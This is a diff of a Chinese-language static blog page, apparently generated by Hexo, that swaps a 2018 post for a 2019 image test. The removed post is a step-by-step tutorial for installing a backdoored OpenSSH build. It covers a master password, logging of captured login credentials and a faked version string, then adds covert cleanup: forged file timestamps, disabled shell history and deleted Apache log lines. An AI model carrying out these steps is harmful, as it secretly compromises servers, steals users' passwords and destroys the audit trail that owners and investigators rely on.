@@ -75,17 +75,19 @@
 
 
 
-<meta name="description" content="#SSH后门复现 最开始先查看自己的ssh版本ssh -v 然后下载openssh和ssh后门12345678wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gzwget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gztar zxv">
+<meta name="description" content="这是在测试图片">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSH后门复现">
-<meta property="og:url" content="http://yoursite.com/2018/05/15/SSH后门复现/index.html">
+<meta property="og:title" content="testimg">
+<meta property="og:url" content="http://yoursite.com/2019/08/19/testimg/index.html">
 <meta property="og:site_name" content="从零开始的学习生涯">
-<meta property="og:description" content="#SSH后门复现 最开始先查看自己的ssh版本ssh -v 然后下载openssh和ssh后门12345678wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gzwget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gztar zxv">
+<meta property="og:description" content="这是在测试图片">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-15T12:05:51.030Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/FDrag0n/image/master/img/20190819105005.jpg">
+<meta property="og:updated_time" content="2019-08-19T02:50:54.034Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SSH后门复现">
-<meta name="twitter:description" content="#SSH后门复现 最开始先查看自己的ssh版本ssh -v 然后下载openssh和ssh后门12345678wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gzwget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gztar zxv">
+<meta name="twitter:title" content="testimg">
+<meta name="twitter:description" content="这是在测试图片">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/FDrag0n/image/master/img/20190819105005.jpg">
 
 
 
@@ -115,13 +117,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/05/15/SSH后门复现/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/19/testimg/">
 
 
 
 
 
-  <title>SSH后门复现 | 从零开始的学习生涯</title>
+  <title>testimg | 从零开始的学习生涯</title>
   
 
 
@@ -278,7 +280,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/15/SSH后门复现/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/testimg/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="FDrag0n">
@@ -295,7 +297,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SSH后门复现</h1>
+          <h1 class="post-title" itemprop="name headline">testimg</h1>
         
 
         <div class="post-meta">
@@ -307,8 +309,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-15T20:01:46+08:00">
-                2018-05-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-19T10:47:49+08:00">
+                2019-08-19
               </time>
             
 
@@ -350,25 +352,7 @@
       
 
       
-        <p>#SSH后门复现</p>
-<h3 id="最开始先查看自己的ssh版本"><a href="#最开始先查看自己的ssh版本" class="headerlink" title="最开始先查看自己的ssh版本"></a>最开始先查看自己的ssh版本</h3><pre><code>ssh -v
-</code></pre><h3 id="然后下载openssh和ssh后门"><a href="#然后下载openssh和ssh后门" class="headerlink" title="然后下载openssh和ssh后门"></a>然后下载openssh和ssh后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget http://down1.chinaunix.net/distfiles/openssh-5.9p1.tar.gz</span><br><span class="line">wget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</span><br><span class="line">tar zxvf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">cd openssh-5.9p1.patch/</span><br><span class="line">cp sshbd5.9p1.diff ../openssh-5.9p1</span><br><span class="line">cd ../openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff   //patch  后门</span><br></pre></td></tr></table></figure>
-<p>这时有可能出现报错信息<br><strong>-bash: patch: command not found</strong><br>代表没有安装patch命令包，解决方案：</p>
-<pre><code>yum -y install patch
-</code></pre><h3 id="备份SSH原始配置文件"><a href="#备份SSH原始配置文件" class="headerlink" title="备份SSH原始配置文件"></a>备份SSH原始配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br></pre></td></tr></table></figure>
-<h3 id="修改后门密码，和记录文件的位置"><a href="#修改后门密码，和记录文件的位置" class="headerlink" title="修改后门密码，和记录文件的位置"></a>修改后门密码，和记录文件的位置</h3><pre><code>vi includes.h
-</code></pre><p>找到并修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define ILOG &quot;/tmp/ilog&quot;</span><br><span class="line">//记录登录到本机的用户名和密码</span><br><span class="line">#define OLOG &quot;/tmp/olog&quot;</span><br><span class="line">//记录本机登录到远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;fdrag0n&quot;</span><br><span class="line">//你后门的密码</span><br></pre></td></tr></table></figure></p>
-<h3 id="修改SSH版本信息，改为第一步看到的"><a href="#修改SSH版本信息，改为第一步看到的" class="headerlink" title="修改SSH版本信息，改为第一步看到的"></a>修改SSH版本信息，改为第一步看到的</h3><pre><code>vi version.h
-</code></pre><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>如果没有以上环境有可能会报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc</span><br><span class="line">yum install -y openssl openssl-devel pam-devel</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br></pre></td></tr></table></figure>
-<p>如果出现报错信息中带有：<br><strong>configure: error:  zlib.h missing – please install first or check config.log</strong>之类的信息<br>安装zib</p>
-<pre><code>yum install -y zlib
-</code></pre><h3 id="安装并重启SSH"><a href="#安装并重启SSH" class="headerlink" title="安装并重启SSH"></a>安装并重启SSH</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>
-<h3 id="简单处理记录"><a href="#简单处理记录" class="headerlink" title="简单处理记录"></a>简单处理记录</h3><h4 id="还原新配置文件为旧配置文件时间"><a href="#还原新配置文件为旧配置文件时间" class="headerlink" title="还原新配置文件为旧配置文件时间"></a>还原新配置文件为旧配置文件时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
-<p>将ssh_config和sshd_config修改时间跟ssh_config.old和sshd_config.old一致，减少被发现的概率。</p>
-<h4 id="清除apache日志"><a href="#清除apache日志" class="headerlink" title="清除apache日志"></a>清除apache日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE=/dev/null </span><br><span class="line">export HISTSIZE=0 </span><br><span class="line">cd /etc/httpd/logs/ </span><br><span class="line">sed -i ‘/192.168.52.175/d’ access_log* </span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure>
-<h4 id="清除用户目录下的-bash-history文件"><a href="#清除用户目录下的-bash-history文件" class="headerlink" title="清除用户目录下的.bash_history文件"></a>清除用户目录下的.bash_history文件</h4><pre><code>vi .bash_history
-</code></pre><p>然后全部删除保存。</p>
+        <h1 id="这是在测试图片"><a href="#这是在测试图片" class="headerlink" title="这是在测试图片"></a>这是在测试图片</h1><p><img src="https://raw.githubusercontent.com/FDrag0n/image/master/img/20190819105005.jpg" alt=""></p>
 
       
     </div>
@@ -393,8 +377,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/05/sql手注步骤/" rel="next" title="sql手注步骤（非盲注）">
-                <i class="fa fa-chevron-left"></i> sql手注步骤（非盲注）
+              <a href="/2018/11/11/自用Linux命令手册/" rel="next" title="自用Linux命令手册">
+                <i class="fa fa-chevron-left"></i> 自用Linux命令手册
               </a>
             
           </div>
@@ -402,10 +386,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/07/19/破解中兴电视盒子/" rel="prev" title="破解中兴电视盒子">
-                破解中兴电视盒子 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -556,7 +536,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#最开始先查看自己的ssh版本"><span class="nav-text">最开始先查看自己的ssh版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#然后下载openssh和ssh后门"><span class="nav-text">然后下载openssh和ssh后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#备份SSH原始配置文件"><span class="nav-text">备份SSH原始配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改后门密码，和记录文件的位置"><span class="nav-text">修改后门密码，和记录文件的位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改SSH版本信息，改为第一步看到的"><span class="nav-text">修改SSH版本信息，改为第一步看到的</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#环境配置"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装并重启SSH"><span class="nav-text">安装并重启SSH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单处理记录"><span class="nav-text">简单处理记录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#还原新配置文件为旧配置文件时间"><span class="nav-text">还原新配置文件为旧配置文件时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#清除apache日志"><span class="nav-text">清除apache日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#清除用户目录下的-bash-history文件"><span class="nav-text">清除用户目录下的.bash_history文件</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#这是在测试图片"><span class="nav-text">这是在测试图片</span></a></li></ol></div>
             
 
           </div>
